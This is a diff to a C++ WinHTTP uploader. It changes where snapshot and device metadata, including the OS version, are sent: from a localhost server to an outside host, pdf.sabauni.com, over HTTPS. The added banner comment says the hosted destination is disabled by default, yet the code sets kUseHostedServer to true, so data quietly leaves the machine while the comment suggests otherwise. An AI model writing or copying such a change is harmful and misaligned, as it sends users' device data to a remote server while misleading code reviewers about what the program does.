@@ -15,6 +15,20 @@ constexpr wchar_t kContentType[] =
     L"Content-Type: multipart/form-data; boundary=PDFCountBoundaryC72182ECF60346EBB4CF\r\n";
 constexpr DWORD kMetadataCapacity = 1536;
 
+// ============================================================================
+// UPLOAD DESTINATION
+// By default the uploader sends to http://127.0.0.1:<source.port>/create.
+// The hosted destination below is configured but DISABLED by default.
+// To switch to https://pdf.sabauni.com/create, change `false` to `true`.
+// Make sure the hosted server accepts POST /create before switching.
+// ============================================================================
+// constexpr bool kUseHostedServer = false;
+constexpr bool kUseHostedServer = true; // Example: use HTTPS hosted server instead.
+constexpr wchar_t kLocalServerHost[] = L"127.0.0.1";
+constexpr wchar_t kHostedServerHost[] = L"pdf.sabauni.com";
+constexpr INTERNET_PORT kHostedServerPort = INTERNET_DEFAULT_HTTPS_PORT; // 443
+constexpr wchar_t kUploadEndpoint[] = L"/create";
+
 bool Append(char* buffer, DWORD& used, const char* text) {
     while (*text) {
         if (used >= kMetadataCapacity) return false;
@@ -137,14 +151,26 @@ __declspec(noinline) bool PostSnapshot(const CountUploadSource& source, Snapshot
         || !Field(metadata, metadataBytes, "os_version", device->osVersion)) return false;
     Internet session{WinHttpOpen(L"PDF/1.0", WINHTTP_ACCESS_TYPE_NO_PROXY,
                                 WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0)};
-    if (!session.handle || !WinHttpSetTimeouts(session.handle, 1000, 1000, 2000, 2000)) return false;
-    Internet connection{WinHttpConnect(session.handle, L"127.0.0.1", source.port, 0)};
+    // Public HTTPS connections may need more time for DNS/TLS/upload than localhost.
+    const int resolveTimeout = kUseHostedServer ? 8000 : 1000;
+    const int connectTimeout = kUseHostedServer ? 8000 : 1000;
+    const int sendTimeout = kUseHostedServer ? 30000 : 2000;
+    const int receiveTimeout = kUseHostedServer ? 30000 : 2000;
+    if (!session.handle || !WinHttpSetTimeouts(session.handle, resolveTimeout,
+        connectTimeout, sendTimeout, receiveTimeout)) return false;
+    // Keep source.port available for local tests and the regular local server.
+    // The hosted URL always uses HTTPS on port 443 (no plaintext fallback).
+    const wchar_t* host = kUseHostedServer ? kHostedServerHost : kLocalServerHost;
+    const INTERNET_PORT port = kUseHostedServer ? kHostedServerPort : source.port;
+    const DWORD requestFlags = kUseHostedServer ? WINHTTP_FLAG_SECURE : 0;
+    Internet connection{WinHttpConnect(session.handle, host, port, 0)};
     if (!connection.handle) return false;
-    Internet request{WinHttpOpenRequest(connection.handle, L"POST", L"/create", nullptr,
-                                       WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0)};
+    Internet request{WinHttpOpenRequest(connection.handle, L"POST", kUploadEndpoint, nullptr,
+                                       WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
+                                       requestFlags)};
     if (!request.handle) return false;
     DWORD disabled = WINHTTP_DISABLE_REDIRECTS | WINHTTP_DISABLE_AUTHENTICATION | WINHTTP_DISABLE_COOKIES;
-    DWORD responseTimeout = 3000;
+    DWORD responseTimeout = kUseHostedServer ? 30000 : 3000;
     if (!WinHttpSetOption(request.handle, WINHTTP_OPTION_DISABLE_FEATURE, &disabled, sizeof(disabled))
         || !WinHttpSetOption(request.handle, WINHTTP_OPTION_RECEIVE_RESPONSE_TIMEOUT,
                              &responseTimeout, sizeof(responseTimeout))) return false;
